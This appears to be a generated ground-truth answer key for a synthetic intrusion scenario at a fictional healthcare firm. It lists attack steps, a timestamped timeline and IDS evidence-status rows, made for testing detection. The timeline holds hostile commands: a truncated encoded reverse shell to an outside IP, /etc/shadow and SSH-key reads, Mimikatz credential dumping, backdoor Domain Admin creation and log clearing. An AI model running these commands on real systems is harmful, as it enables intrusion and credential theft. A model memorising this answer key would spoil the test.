# Ground Truth: iteration-test-expanded-ids

**Scenario:** IDS-focused variant of the expanded EvidenceForge iteration-test scenario for fast
generate/evaluate/fix cycles. It preserves the original environment and attack narrative
while adding authored, transport-correlated IDS assertions, sensor-local filtering, and
deliberate no-alert cases for broad automated and LLM-as-a-judge quality evaluation.
Meridian Healthcare Solutions is a mid-size healthcare IT company providing EHR
integration services from a corporate HQ with an on-premises data center. The
storyline compresses an APT-style web-app intrusion, Linux and Windows lateral
movement, credential theft, domain compromise, C2, DNS tunneling, data staging,
exfiltration, email abuse, and cleanup into a 6-hour collection window while
preserving broad event-type and log-format coverage. This expanded variant adds
explicit on-prem email topology, SMTP routing, corpus-backed message bodies,
MIME artifacts, distribution groups, Bcc handling, STARTTLS visibility, ISP relay
egress, inbound/outbound/internal mail, explicit mailbox reads, rejected mail,
and deterministic background email traffic.


**Generated:** 2024-03-18 12:00:00 UTC


## Attack Summary

This scenario simulates the following attack sequence:

1. **diego.ramirez** on **WS-DRAMIREZ-01**: External benefits-themed phishing message is delivered to Finance with hidden security Bcc
2. **diego.ramirez** on **WS-DRAMIREZ-01**: Finance user reads the suspicious benefits message through OWA
3. **diego.ramirez** on **WS-DRAMIREZ-01**: Diego forwards the suspicious message to the help desk and discreetly copies security
4. **root** on **WEB-EXT-01**: External attacker scans the DMZ for exposed services
5. **root** on **WEB-EXT-01**: External attacker runs Nikto web vulnerability scanning against the EHR portal
6. **root** on **LT-MRIVERA-02**: Rogue laptop obtains an address from DHCP on the corporate LAN
7. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an internal EHR release note to a clinical operations distribution group
8. **omar.haddad** on **WS-OHADDAD-01**: Analytics user reads the EHR release note through IMAPS
9. **apache** on **WEB-EXT-01**: SQL injection probes against the EHR portal produce server errors
10. **apache** on **WEB-EXT-01**: Web shell upload and reverse shell callback to direct-IP C2
11. **root** on **WEB-EXT-01**: Network and host discovery from the compromised web server
12. **priya.patel** on **WS-PPATEL-01**: A vendor document workflow sends security an AI-generated summary with prompt-injection text in an attachment
13. **lina.nguyen** on **WS-LNGUYEN-01**: Engineering sends an outbound interface package to a lab vendor through the clinical route and ISP relay
14. **root** on **WEB-EXT-01**: Harvest database credentials and SSH key material from the web server
15. **root** on **APP-INT-01**: Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01
16. **root** on **APP-INT-01**: Dump Linux password databases from APP-INT-01
17. **marcus.chen** on **WS-MCHEN-01**: Attacker uses explicit sysadmin credentials through RunAs
18. **root** on **LT-MRIVERA-02**: Wrong-password fumble before broader credential spray
19. **root** on **WS-AJOHNSON-01**: Credential spray succeeds against help desk user followed by RDP session
20. **aisha.johnson** on **WS-AJOHNSON-01**: Compromised help desk mailbox sends an internal credential-reset lure to finance
21. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker reads the compromised help desk mailbox through IMAPS
22. **aisha.johnson** on **WS-AJOHNSON-01**: Active Directory enumeration from compromised workstation
23. **aisha.johnson** on **WS-AJOHNSON-01**: Credential dumping with Mimikatz disguised as a Windows indexing service
24. **aisha.johnson** on **DC-01**: PsExec-style lateral movement to DC-01 through SMB service creation
25. **evelyn.brooks** on **WS-EBROOKS-01**: External invoice-themed attachment is rejected by the mail gateway
26. **SYSTEM** on **DC-01**: Create backdoor account and add it to Domain Admins
27. **SYSTEM** on **DC-01**: Install service and scheduled task persistence on DC-01
28. **SYSTEM** on **DC-01**: Allowed HTTPS beacon from DC-01 to attacker infrastructure
29. **SYSTEM** on **DC-01**: Direct C2 beacon attempts from DC-01 are blocked by firewall
30. **root** on **APP-INT-01**: DNS tunneling exfiltration from APP-INT-01
31. **evelyn.brooks** on **WS-EBROOKS-01**: Executive sends an inline-authored operating note to an outside advisor with internal Bcc
32. **root** on **WEB-EXT-01**: DGA queries from compromised web server
33. **svc_mhsync** on **FILE-SRV-01**: Backdoor account authenticates to FILE-SRV-01 and stages sensitive data
34. **root** on **DB-PROD-01**: SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01
35. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker locks compromised workstation before stepping away
36. **aisha.johnson** on **WS-AJOHNSON-01**: Upload compressed archive to external staging domain over HTTPS
37. **root** on **WEB-EXT-01**: Ongoing periodic beacon from WEB-EXT-01
38. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker returns and unlocks compromised workstation
39. **root** on **WEB-EXT-01**: Clear Linux shell history on WEB-EXT-01
40. **root** on **APP-INT-01**: Clear Linux shell history on APP-INT-01
41. **SYSTEM** on **DC-01**: Encoded PowerShell download and Security log clearing on DC-01
42. **root** on **APP-INT-01**: Standalone DNS queries for attacker infrastructure
43. **SYSTEM** on **DC-01**: Delete backdoor account after exfiltration
44. **aisha.johnson** on **WS-AJOHNSON-01**: Attacker logs off compromised help desk workstation
45. **svc_mhsync** on **FILE-SRV-01**: Backdoor account session logs off FILE-SRV-01
46. **root** on **APP-INT-01**: Root SSH session logs off APP-INT-01


## Timeline

| Timestamp | Actor | System | Event Type | Details |
|-----------|-------|--------|------------|---------|
| 2024-03-18 12:11:37 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: notices@benefits-serviceportal.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Benefits confirmation required today' (artifacts/email/benefits-confirmation-msg.eml) |
| 2024-03-18 12:17:40 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Read | Mailbox read: diego.ramirez@meridianhcs.com via owa on finance (UID: CQWA6DQKewY5Xfyg9F) |
| 2024-03-18 12:24:07 UTC | diego.ramirez | WS-DRAMIREZ-01 | Email_Message | Email delivered: diego.ramirez@meridianhcs.com -> aisha.johnson@meridianhcs.com, marcus.chen@meridianhcs.com, priya.patel@meridianhcs.com; subject 'Fwd: Benefits confirmation required today' (artifacts/email/finance-forward-to-it-msg.eml) |
| 2024-03-18 12:30:00 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [22], 1 denied connections + ASA threat detection alert (733100) [IDS: SID 2002911 policy={'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=0 emitted=0 filtered=0] |
| 2024-03-18 12:30:01 UTC | root | WEB-EXT-01 | Port_Scan | Port scan: 1 targets, ports [80, 443, 8080, 8443, 3306], 5 denied connections + ASA threat detection alert (733100) |
| 2024-03-18 12:30:48 UTC | root | WEB-EXT-01 | Web_Scan | Web scan (nikto) against 10.10.3.10:443 (433 requests) |
| 2024-03-18 12:45:12 UTC | root | LT-MRIVERA-02 | Dhcp_Lease | DHCP lease for LT-MRIVERA-02 (MAC: DC:A6:32:44:91:7B) |
| 2024-03-18 12:47:45 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> lina.nguyen@meridianhcs.com, omar.haddad@meridianhcs.com, priya.patel@meridianhcs.com; subject 'EHR connector release notes' (artifacts/email/ehr-release-note-msg.eml) |
| 2024-03-18 12:53:19 UTC | omar.haddad | WS-OHADDAD-01 | Email_Read | Mailbox read: omar.haddad@meridianhcs.com via imaps on clinical (UID: CqSc0CDuQvhOpSGhbdj) |
| 2024-03-18 12:59:41 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CS82r6DNXMCYZDWtjB) |
| 2024-03-18 12:59:43 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: CFXo1ISvHONRmgLLRs) |
| 2024-03-18 13:19:42 UTC | apache | WEB-EXT-01 | Connection | Connection to 203.14.220.10:443 (UID: Ce4UkXAoLhPTT56N0O) |
| 2024-03-18 13:19:43 UTC | apache | WEB-EXT-01 | Process | Process: /bin/bash (PID: 581382) - `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L...` |
| 2024-03-18 13:19:45 UTC | apache | WEB-EXT-01 | Connection | Connection to 45.33.32.30:8443 (UID: CFPWXD0xlCilf6TDao) |
| 2024-03-18 13:19:45 UTC | apache | WEB-EXT-01 | Raw | Web shell upload and reverse shell callback to direct-IP C2 |
| 2024-03-18 13:39:36 UTC | root | WEB-EXT-01 | Process | Process: /usr/sbin/ip (PID: 584264) - `ip addr show` |
| 2024-03-18 13:39:42 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 584301) - `cat /etc/hosts` |
| 2024-03-18 13:39:54 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 585060) - `cat /etc/resolv.conf` |
| 2024-03-18 13:45:16 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/find (PID: 585084) - `find /opt/ehr -name '*credential*' -maxdepth 3` |
| 2024-03-18 13:45:26 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585155) - `nmap -sn 10.10.2.0/24` |
| 2024-03-18 13:46:01 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/nmap (PID: 585311) - `nmap -sT -p 22,80,443,445,3306 10.10.2.0/24` |
| 2024-03-18 13:49:52 UTC | priya.patel | WS-PPATEL-01 | Email_Message | Email delivered: workspace@docflow-health.net -> priya.patel@meridianhcs.com; subject 'DocFlow summary package: vendor terms' (artifacts/email/docflow-ai-summary-msg.eml) |
| 2024-03-18 13:55:31 UTC | lina.nguyen | WS-LNGUYEN-01 | Email_Message | Email delivered: lina.nguyen@meridianhcs.com -> miles.avery@stonebridge-consultingllc.com, omar.haddad@meridianhcs.com; subject 'Stonebridge interface package comments' (artifacts/email/vendor-interface-package-msg.eml) |
| 2024-03-18 13:59:35 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 587083) - `cat /var/www/html/config.php` |
| 2024-03-18 13:59:41 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/ls (PID: 587841) - `ls -la /root/.ssh` |
| 2024-03-18 14:06:11 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/cat (PID: 590459) - `cat /root/.ssh/id_rsa` |
| 2024-03-18 14:14:32 UTC | root | APP-INT-01 | Connection | Connection to 10.10.3.20:22 (UID: C0DCRdWx8S13Oq8ARc) |
| 2024-03-18 14:14:33 UTC | root | APP-INT-01 | Ssh_Session | SSH session to 10.10.2.30:22 (UID: C0xWrc3BSbpP9IdhSMU) [IDS: SID 2002911 policy={'detection_filter': None, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 1, 'seconds': 60}} candidates=2 emitted=2 filtered=0] |
| 2024-03-18 14:35:12 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962162) - `cat /etc/passwd` |
| 2024-03-18 14:35:20 UTC | root | APP-INT-01 | Process | Process: /usr/bin/cat (PID: 962194) - `cat /etc/shadow` |
| 2024-03-18 14:50:23 UTC | marcus.chen | WS-MCHEN-01 | Explicit_Credentials | Explicit credentials: RunAs marcus.chen on DC-01 |
| 2024-03-18 14:58:51 UTC | root | LT-MRIVERA-02 | Failed_Logon | Wrong-password fumble before broader credential spray |
| 2024-03-18 14:59:49 UTC | root | WS-AJOHNSON-01 | Credential_Spray | Credential spray: 4 attempts against 3 accounts (success: aisha.johnson at attempt 4) |
| 2024-03-18 14:59:49 UTC | aisha.johnson | WS-AJOHNSON-01 | Rdp_Session | RDP session to 10.10.1.35:3389 (UID: C8OGMFYUvYBOJkXC4F) |
| 2024-03-18 15:08:17 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Message | Email delivered: aisha.johnson@meridianhcs.com -> diego.ramirez@meridianhcs.com, evelyn.brooks@meridianhcs.com, marcus.chen@meridianhcs.com; subject 'Help desk follow-up: credential reset validation' (artifacts/email/internal-reset-lure-msg.eml) |
| 2024-03-18 15:13:50 UTC | aisha.johnson | WS-AJOHNSON-01 | Email_Read | Mailbox read: aisha.johnson@meridianhcs.com via imaps on edge (UID: ClOmdL2u3YprugBKLq) |
| 2024-03-18 15:19:51 UTC | aisha.johnson | WS-AJOHNSON-01 | Logon | Network logon from 10.10.1.99 (LogonID: 0x27002bb) |
| 2024-03-18 15:19:53 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\whoami.exe (PID: 7128) - `whoami /all` |
| 2024-03-18 15:19:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7140) - `net user /domain` |
| 2024-03-18 15:19:59 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7172) - `net group "Domain Admins" /domain` |
| 2024-03-18 15:20:00 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7176) - `net view /domain` |
| 2024-03-18 15:20:02 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 10.10.2.10:389 (UID: Cj2BM11ABrDbS4ElwjS) |
| 2024-03-18 15:20:02 UTC | aisha.johnson | WS-AJOHNSON-01 | Dns_Query | DNS query: DC-01.meridianhcs.local (A, NOERROR) |
| 2024-03-18 15:44:42 UTC | aisha.johnson | WS-AJOHNSON-01 | Process | Process: C:\Windows\System32\ms-index-service.exe (PID: 7184) - `ms-index-service.exe "privilege::debug" "sekurl...` |
| 2024-03-18 15:44:44 UTC | aisha.johnson | WS-AJOHNSON-01 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2024-03-18 15:44:44 UTC | aisha.johnson | WS-AJOHNSON-01 | Process_Access | Credential dumping with Mimikatz disguised as a Windows indexing service |
| 2024-03-18 16:00:05 UTC | aisha.johnson | DC-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0x55546de) |
| 2024-03-18 16:00:07 UTC | aisha.johnson | DC-01 | Service_Installed | Service installed: PSEXESVC (%SystemRoot%\PSEXESVC.exe) |
| 2024-03-18 16:00:08 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\PSEXESVC.exe (PID: 5632) - `PSEXESVC.exe -accepteula` |
| 2024-03-18 16:00:21 UTC | aisha.johnson | DC-01 | Process | Process: C:\Windows\System32\cmd.exe (PID: 5636) - `cmd.exe /c whoami && hostname` |
| 2024-03-18 16:07:11 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email rejected: billing@medclaims-processing.net -> evelyn.brooks@meridianhcs.com; subject 'Updated claims processing invoice' (metadata-only) |
| 2024-03-18 16:14:32 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5652) - `net user svc_mhsync MhsSvc!2024 /add /domain` |
| 2024-03-18 16:14:33 UTC | SYSTEM | DC-01 | Account_Created | Account created: svc_mhsync |
| 2024-03-18 16:14:34 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5660) - `net group "Domain Admins" svc_mhsync /add /domain` |
| 2024-03-18 16:14:40 UTC | SYSTEM | DC-01 | Group_Member_Added | Added svc_mhsync to group Domain Admins |
| 2024-03-18 16:20:16 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 5672) - `sc.exe create DeviceSyncSvc binPath= C:\Windows...` |
| 2024-03-18 16:20:18 UTC | SYSTEM | DC-01 | Service_Installed | Service installed: DeviceSyncSvc (C:\Windows\System32\DeviceSyncSvc.exe) |
| 2024-03-18 16:20:20 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 5712) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2024-03-18 16:20:31 UTC | SYSTEM | DC-01 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\DeviceSync |
| 2024-03-18 16:29:55 UTC | SYSTEM | DC-01 | Beacon | Beacon to 45.33.32.30:443 (10 attempts, 1h30m) |
| 2024-03-18 16:31:20 UTC | SYSTEM | DC-01 | Beacon | Denied beacon to 45.33.32.30:443 (4 attempts, 1h30m) |
| 2024-03-18 16:45:15 UTC | root | APP-INT-01 | Dns_Tunnel | DNS tunnel via ns1.westbridge-services.cloud (hex, 259 queries, 1382 bytes exfiltrated) [IDS: SID 2029706 policy={'detection_filter': {'track': 'by_src', 'count': 10, 'seconds': 60}, 'event_filter': {'type': 'limit', 'track': 'by_src', 'count': 2, 'seconds': 300}} candidates=258 emitted=6 filtered=252] |
| 2024-03-18 16:50:17 UTC | evelyn.brooks | WS-EBROOKS-01 | Email_Message | Email delivered: evelyn.brooks@meridianhcs.com -> marina.holt@northbridge-advisory.com, diego.ramirez@meridianhcs.com, priya.patel@meridianhcs.com; subject 'March operating note' (artifacts/email/executive-operating-note-msg.eml) |
| 2024-03-18 17:00:01 UTC | root | WEB-EXT-01 | Dga_Queries | DGA queries: 91 total (80 NXDOMAIN, TLD: .top, sample: ['ewnjsaqf1rasgez5.top', '6cja6syvo02mu.top', '30rgw6r7503.top']) [IDS: SID 2027865 policy={'detection_filter': {'track': 'by_src', 'count': 2, 'seconds': 120}, 'event_filter': {'type': 'both', 'track': 'by_src', 'count': 1, 'seconds': 300}} candidates=178 emitted=18 filtered=160] |
| 2024-03-18 17:01:08 UTC | svc_mhsync | FILE-SRV-01 | Logon | Network logon from 10.10.1.35 (LogonID: 0xf885947) |
| 2024-03-18 17:01:10 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\net.exe (PID: 5772) - `net view \\FILE-SRV-01` |
| 2024-03-18 17:01:12 UTC | svc_mhsync | FILE-SRV-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 5788) - `powershell.exe -NoProfile -Command "Compress-Ar...` |
| 2024-03-18 17:14:44 UTC | root | DB-PROD-01 | Ssh_Session | SSH session to 10.10.4.10:22 (UID: CIRPxx5IFGHrdEg7C) |
| 2024-03-18 17:14:46 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/mysqldump (PID: 158513) - `mysqldump --single-transaction ehr patients ins...` |
| 2024-03-18 17:17:29 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/gzip (PID: 160869) - `gzip -9 /tmp/rpt_0318.sql` |
| 2024-03-18 17:19:39 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Lock | Workstation Locked |
| 2024-03-18 17:25:30 UTC | aisha.johnson | WS-AJOHNSON-01 | Connection | Connection to 45.33.32.30:443 (UID: CfRz15RM76EhfFzrEr) |
| 2024-03-18 17:29:59 UTC | root | WEB-EXT-01 | Beacon | Beacon to 45.33.32.30:443 (3 attempts, count=3) |
| 2024-03-18 17:31:27 UTC | root | DB-PROD-01 | Process | Process: /usr/bin/scp (PID: 161147) - `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/....` |
| 2024-03-18 17:35:19 UTC | aisha.johnson | WS-AJOHNSON-01 | Workstation_Unlock | Workstation Unlocked |
| 2024-03-18 17:39:37 UTC | root | WEB-EXT-01 | Process | Process: /usr/bin/shred (PID: 608745) - `shred -u /root/.bash_history` |
| 2024-03-18 17:41:19 UTC | root | APP-INT-01 | Process | Process: /bin/bash (PID: 982895) - `history -c && cat /dev/null > ~/.bash_history` |
| 2024-03-18 17:42:01 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 6140) - `powershell.exe -NoProfile -EncodedCommand SQBFA...` |
| 2024-03-18 17:42:02 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 6156) - `wevtutil cl Security` |
| 2024-03-18 17:42:03 UTC | SYSTEM | DC-01 | Log_Cleared | Encoded PowerShell download and Security log clearing on DC-01 |
| 2024-03-18 17:44:36 UTC | root | APP-INT-01 | Dns_Query | DNS query: edge.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:38 UTC | root | APP-INT-01 | Dns_Query | DNS query: api.westbridge-services.net (A, NOERROR) |
| 2024-03-18 17:44:39 UTC | root | APP-INT-01 | Dns_Query | DNS query: metrics.westbridge-services.net (TXT, NXDOMAIN) |
| 2024-03-18 17:50:29 UTC | SYSTEM | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 6200) - `net user svc_mhsync /delete /domain` |
| 2024-03-18 17:50:38 UTC | SYSTEM | DC-01 | Account_Deleted | Account deleted: svc_mhsync |
| 2024-03-18 17:54:58 UTC | aisha.johnson | WS-AJOHNSON-01 | Logoff | Attacker logs off compromised help desk workstation |
| 2024-03-18 17:56:27 UTC | svc_mhsync | FILE-SRV-01 | Logoff | Backdoor account session logs off FILE-SRV-01 |
| 2024-03-18 17:56:53 UTC | root | APP-INT-01 | Logoff | Root SSH session logs off APP-INT-01 |


## Source Evidence Status

Canonical ground truth remains authoritative. Source rows may be `visible`, `delayed`, `dropped`, `filtered`, or `out_of_window` depending on the selected observation profile and sensor placement.

| Storyline ID | Source | Status Counts |
|--------------|--------|---------------|
| 024e3ce9-07dc-45c3-93b5-38f4c23a9d0d | ids | delayed: 1 |
| 0378f291-1043-4e88-960f-b651d4439a18 | ids | delayed: 1 |
| 041213f3-c4c3-4524-81e1-98d460341ba4 | ids | delayed: 1 |
| 04d9d550-26af-48c3-95b7-d7b904db7262 | ids | delayed: 2 |
| 060d3c83-ec43-4d98-8d45-feec1a186e6a | ids | delayed: 1 |
| 08432748-cc6c-460b-bf6f-b8d210b2cf13 | ids | delayed: 1 |
| 087e8295-5e01-41c0-ac3e-a7da50cf405f | ids | delayed: 1 |
| 09932830-44dc-4a10-aad3-f19c5d4ac230 | ids | delayed: 1 |
| 0c7c8c51-a5d6-4417-8a2c-9d9020e7ea21 | ids | delayed: 1 |
| 0d4626c2-b694-40f6-bc65-701e227306ad | ids | delayed: 1 |
| 0e057fbb-09b5-452e-ad89-c7bcc5c782a9 | ids | delayed: 1 |
| 0e39c5ac-6250-4411-89fe-676d6455a4a5 | ids | delayed: 2 |
| 0fe86a0a-5c34-4789-a762-3cfed2370379 | ids | delayed: 1 |
| 11957c44-1e86-4ee3-ba5a-afecfa7ad0da | ids | delayed: 1 |
| 11ad02cd-d49b-45e6-8dc5-22416936065f | ids | delayed: 1 |
| 151ac013-0f75-4d98-8a7f-96f61301acc7 | ids | delayed: 1 |
| 183d1c54-b5fb-4a22-a238-8436acdde7aa | ids | delayed: 1 |
| 19390e4f-7bd9-4722-a188-6349c7790db2 | ids | visible: 1 |
| 19e7faad-f6ab-4289-8c31-a03e9694c2fd | ids | delayed: 1 |
| 1dabe3d5-d7e2-4dfb-bdd5-37a075bab109 | ids | delayed: 1 |
| 1e30e9b3-7eaa-4e4f-9699-ad0780f940f1 | ids | delayed: 1 |
| 1e69fc2a-1609-473b-9845-d8ea0eb3ade4 | ids | delayed: 1 |
| 20475cfc-342e-4c66-be21-29dd112ccd63 | ids | delayed: 2 |
| 20527c7b-2291-4286-b6ab-6998701c986e | ids | delayed: 1 |
| 20c81547-29f3-4a9d-b60f-e832ae829163 | ids | delayed: 1 |
| 21f9a5ba-4113-4eae-8fbc-7611acffe552 | ids | delayed: 2 |
| 2582242f-c332-4079-adad-80aa3761cbd2 | ids | delayed: 2 |
| 25b03e45-fa91-4ac0-adc5-9e6d3e3b5ae9 | ids | delayed: 1 |
| 26237fe8-0b05-435c-b824-6c1510bf9a06 | ids | delayed: 1 |
| 28bee681-0b05-4035-be76-a8444e2da101 | ids | delayed: 1 |
| 2b3b0b27-c80e-4c83-882d-154c23af3e32 | ids | delayed: 2 |
| 2bb2b9b8-7359-418d-b9a8-c2f55d44b145 | ids | delayed: 1 |
| 2bf8ddeb-8840-4dfc-b9be-40e683946128 | ids | delayed: 1 |
| 2d5dc539-2820-4fe6-809e-a55604d8f6f9 | ids | delayed: 2 |
| 32f7ae4d-dc16-4073-9fee-3ce0e6092668 | ids | delayed: 1 |
| 335bbac6-2ef9-41e6-b1fb-f25ff3d7e03a | ids | delayed: 1 |
| 36a38af4-506d-4636-b9b6-7a5265214884 | ids | delayed: 1 |
| 37f225a3-f568-4459-b313-de6c17d0c094 | ids | delayed: 1 |
| 3c9e6fd5-f48e-40c0-ab61-424cc650a9cd | ids | delayed: 1 |
| 3e2aaaeb-a934-43c5-ab4c-9dcb27c09f2c | ids | delayed: 2 |
| 3e77f552-801b-47c7-8488-61fee6a71e6b | ids | delayed: 1 |
| 416f6695-5015-4c65-906d-04fe09201135 | ids | delayed: 1 |
| 420deec8-18d4-4436-92cf-21462d13c322 | ids | delayed: 1 |
| 43c9ef3b-9c0f-4609-a5f3-73fac7c5f1f6 | ids | visible: 1 |
| 49ac0a39-45e4-4057-a18a-8e43583040f9 | ids | delayed: 2 |
| 4d54bb54-b909-4019-830e-75f0efa1913d | ids | delayed: 1 |
| 4d6ce6b7-e74b-4eaa-b9c7-8419241defca | ids | delayed: 1 |
| 50fa1983-d36e-45fe-967e-524e31b38103 | ids | delayed: 1 |
| 51133390-27bc-46db-bb84-f89f65a0a3cb | ids | delayed: 2 |
| 5305c277-bec6-484b-b366-09af7ee9403b | ids | delayed: 1 |
| 5b1bbbc9-be2f-4807-b317-b494911a39b3 | ids | delayed: 1 |
| 5b9025ad-42db-43ad-9a56-56755cf402aa | ids | delayed: 2 |
| 5e9c359a-827c-475b-b19a-8423601dd486 | ids | delayed: 1 |
| 63add1c7-0b66-4b97-b323-9440f59ceacc | ids | delayed: 1 |
| 67f85c3f-28aa-4144-881d-970d0bfabef5 | ids | delayed: 1 |
| 692a8404-723e-4115-a933-2caa15abf7f5 | ids | delayed: 1 |
| 69dbf272-6680-4775-8d3a-84ecf2de79ea | ids | delayed: 2 |
| 6b352bd7-cf4c-41d2-9f6e-24d7fa488358 | ids | delayed: 1 |
| 70543032-af0d-4c58-b70f-44a8835f70fb | ids | delayed: 1 |
| 72966c71-74b5-447f-9458-bd48ee776cd9 | ids | delayed: 1 |
| 7bc6f417-15cb-4482-adcc-93eac533440e | ids | delayed: 1 |
| 80c1b27c-18a1-4b16-a043-9267d3f246c6 | ids | delayed: 2 |
| 83cd97ba-6360-48f7-b53a-b6c98b76eef4 | ids | delayed: 1 |
| 8c535c05-8894-40ed-ab0b-5718e45f984f | ids | delayed: 2 |
| 8d23303c-2a25-4ace-b68b-9f5fa3d06b2c | ids | delayed: 1 |
| 8d4a87ad-b04a-4853-97e8-e003d277e652 | ids | delayed: 1 |
| 8d9cfc13-f80d-4a8e-8bbe-16e4d880de72 | ids | delayed: 1 |
| 8eabd3e6-cb1a-4bd0-9805-fb0037676f23 | ids | delayed: 1 |
| 913f2de2-3ff9-4aff-81c4-ff5327fc122c | ids | delayed: 1 |
| 9203d79e-c060-4271-9722-bcae9420d451 | ids | delayed: 1 |
| 9521c160-7fe4-4f66-bdb8-c0d08fb3390e | ids | delayed: 1 |
| 9860cd82-001f-4c55-97aa-8ea1f29a9502 | ids | visible: 1 |
| 9eb57c64-4957-426c-92c2-ff335e538f1f | ids | delayed: 1 |
| a085f369-ba0b-4682-88b4-4648c0bbecee | ids | delayed: 1 |
| a12d1b20-9ab4-4c44-9e94-a0586da91967 | ids | delayed: 1 |
| a2bcc5f0-5488-4862-a2c5-bcbb7a39d12f | ids | delayed: 1 |
| a4726244-4809-4f6d-a1f2-8996e036ca37 | ids | delayed: 1 |
| a5ac40d5-3470-4ba8-a337-0f2a61505c5f | ids | delayed: 1 |
| a9d691e7-2c6e-4fc0-b71e-ca468594589f | ids | delayed: 1 |
| ab4f6ffe-e6a0-4685-84c3-43302605c581 | ids | delayed: 1 |
| af0cbaac-b599-43d6-8130-8c8857182abd | ids | delayed: 1 |
| b0bf7050-0157-4607-8f9d-3c65cc1e5df0 | ids | delayed: 1 |
| b20eaa61-93f1-4950-a92a-98f878a92765 | ids | delayed: 1 |
| b2729d37-5f3c-419e-a0cf-6482273a2a01 | ids | delayed: 2 |
| b3cac849-0f8b-43cd-b835-040e9dfdb345 | ids | delayed: 2 |
| b4ace977-ccf8-4cfd-96f0-201722a623b1 | ids | delayed: 1 |
| b68e8377-939f-4904-b703-aa05e4dde8a2 | ids | delayed: 1 |
| b9737116-d49c-4cd4-ae07-9c4b50125335 | ids | delayed: 1 |
| bc59d899-03de-429c-9483-8ac9f8490fc1 | ids | delayed: 2 |
| bf1118a8-c9d8-47e9-b3f3-32278c78e431 | ids | delayed: 1 |
| c195e79a-abc4-476c-8ed2-535d7dda15f0 | ids | delayed: 1 |
| c3210ea7-86bd-4f92-be21-becb9be99bd7 | ids | visible: 1 |
| c47b5574-d25d-450a-af24-ef6810cf496d | ids | delayed: 2 |
| c6237d00-8f3d-4e45-a6b7-374ef8d714b5 | ids | delayed: 2 |
| c70de5f9-303c-419a-9816-a000d800f2c0 | ids | delayed: 1 |
| c76da0c9-f3fa-43b2-8831-c018b786ea92 | ids | delayed: 1 |
| c9d90f7a-8f0e-4c6b-aa9c-525cff497f70 | ids | delayed: 1 |
| ca7e97fd-38ee-4f82-9136-a591342ced94 | ids | delayed: 1 |
| caf5d687-f027-4c4b-b90a-31e823c8bb8e | ids | delayed: 1 |
| cc3cd0b5-a3b3-409f-8ae3-24ebea28d120 | ids | delayed: 2 |
| cf28f3eb-7cb3-42cc-917f-3153e3ebecbb | ids | delayed: 1 |
| d1ad0716-f0e4-4bb5-8ebb-72d6728d08d0 | ids | delayed: 2 |
| d2eddb2c-f51d-480f-9ba2-3fc9972aabe3 | ids | delayed: 2 |
| d4e6acd2-029d-40dc-b41e-d2d24746e50f | ids | delayed: 1 |
| d653efbb-5128-4538-a986-3196757a15d4 | ids | delayed: 1 |
| d8677984-45ff-4685-96f4-eeda808939fb | ids | delayed: 1 |
| d8826220-b2a5-45aa-917d-8e909c63c5c6 | ids | delayed: 1 |
| daeed50b-b7df-4fff-89d2-4caabc8bb7ed | ids | delayed: 1 |
| dc1f9056-c158-4b59-a071-dfac8c2eecc4 | ids | delayed: 1 |
